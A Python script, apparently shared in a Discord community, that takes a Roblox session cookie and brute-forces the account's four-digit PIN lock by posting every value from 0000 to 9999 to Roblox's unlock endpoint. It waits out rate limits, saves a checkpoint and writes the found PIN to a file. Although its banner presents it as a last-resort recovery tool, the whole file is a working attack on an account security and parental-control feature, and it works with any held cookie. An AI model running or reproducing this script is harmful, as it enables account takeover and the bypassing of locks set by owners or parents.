import requests
import re
import string
import time
import os


try:
    with open("cookie.txt") as fh:
        cookie = {'.ROBLOSECURITY':fh.read()}
        if len(cookie['.ROBLOSECURITY']) < 1: raise FileNotFoundError
except FileNotFoundError:
    print("Unable to find pin, either a file named 'cookie.txt' doesn't exist or it is empty. \nPlease enter your cookie below: \n")
    cookiestring = input()
    with open("cookie.txt","w") as fh:
        fh.write(cookiestring)
    cookie = {'.ROBLOSECURITY':cookiestring}
    
    
url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = cookie)
token1 = (token.headers['x-csrf-token'])
requestheader = {'X-CSRF-TOKEN': token1}
    




print('''
        Loading Fork 0.1, forked from Version R2.0
        Official server: discord.gg/4sXG2DtU96 \n
        This script might take a very very long time to find a pin due to roblox
        limiting the amount of tries, but it will 100% find it if left to run,
        this script is useful if you have no other choice! \n
        Server Booster Credits: T0m45#0001, frog#8222, champagne charlie#5616, grango#5298,
        pebbles#3363, BlazingWaterz#0001, Sam.#6605, MEDO#1111, Roblox Thot#0001, Ackermann#1629, moq#0001
        (If you boost the server you will be mentioned in all of my scripts!)\n
        Script By: Egypt#2325 (join the server if you have any issues)\n
        Forked by johnngnky#9086
        Contact email: hi@amanda.ng.eu.org \n
        ''')

global i
try:
    with open("checkpoint.txt") as fh:
        i = int(fh.read())
    if 0>i>10000: raise ValueError
except FileNotFoundError:
    i = 0
except ValueError:
    print("checkpoint content unable to be read correctly.")
    raise RuntimeError

if i>0: print(f"Seems like we have ran this program before, we'll be starting at {i}")

while i < 10000:
    
    try:

        realpin = str(i).zfill(4)
        payload = {'pin': realpin}
        
        r = requests.post(url, data = payload, headers = requestheader, cookies = cookie)
        
        if 'unlockedUntil' in r.text:

            hit = "THE PIN IS: " + realpin
            print('FOUND PIN: ' + hit)
            with open("pin.txt","w") as fh:
                fh.write(hit)

            input('Pin has been found, press enter to exit!')
            
            break
            
        elif 'Too many requests made' in r.text:
                
            print('Roblox Blocked Request, please wait...')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('Authorization error, please make sure you have the correct cookie!')
            
            raise AssertionError
            
        elif 'Incorrect' in r.text:

            failedhit = "Tried: " + realpin
            print(failedhit)
            i += 1
            time.sleep(5)
        else:
            raise AssertionError

    except KeyboardInterrupt:
        with open("checkpoint.txt","x") as fh:
            fh.write(realpin)
        print(f"Ctrl+C caught; currently trying {realpin}, next time you run the script, we'll start there.")
        input("Press enter to exit.")
    except Exception as e:
        print(e)
        print(r.text)
        print(payload)
        print('An error has occured. Please contact official support or send me an email at hi@amanda.ng.eu.org')
        input('Press enter to exit!')
        


        



    
        
            
        



